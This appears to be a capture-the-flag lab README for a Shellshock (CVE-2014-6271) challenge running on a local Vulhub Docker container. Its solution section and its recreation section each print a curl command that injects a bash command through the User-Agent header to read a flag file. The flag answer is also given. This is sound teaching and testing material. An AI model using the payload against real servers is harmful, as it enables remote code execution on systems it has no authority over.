# Challenge 8: Shellshock

## How to Start
```bash
docker compose pull
docker compose up -d
```

---

## Description
This challenge demonstrates how to exploit the **Shellshock vulnerability (CVE-2014-6271)** in a CGI script to achieve **Remote Code Execution (RCE)** and retrieve a flag.

---

## Solution
1. Identify the vulnerable `victim.cgi` file by exploring the container via the web application.
2. Execute the following command to read the flag:
   ```bash
   curl -H "User-Agent: () { :;}; echo; echo; /bin/cat /var/www/html/flag.txt" http://localhost:8066/victim.cgi
   ```

**Flag:**
```
flag{pwned_by_shellshock}
```

---

## How to Recreate

### 1. Clone the Vulhub Repository
```bash
git clone https://github.com/vulhub/vulhub
```

### 2. Navigate to the Shellshock CVE Directory
```bash
cd vulhub/bash/CVE-2014-6271
```

### 3. Start the Container
```bash
docker-compose up -d
```

### 4. Add the Flag
Place your flag in the desired directory within the container, for example:
```bash
echo "flag{pwned_by_shellshock}" > /var/www/html/flag.txt
```

### 5. Test the Exploit
Run:
```bash
curl -H "User-Agent: () { :;}; echo; echo; /bin/cat /var/www/html/flag.txt" http://localhost:8066/victim.cgi
```

---

## Final Notes
This challenge highlights the dangers of outdated Bash versions and improperly secured CGI scripts, which can be exploited to execute arbitrary commands on the server.
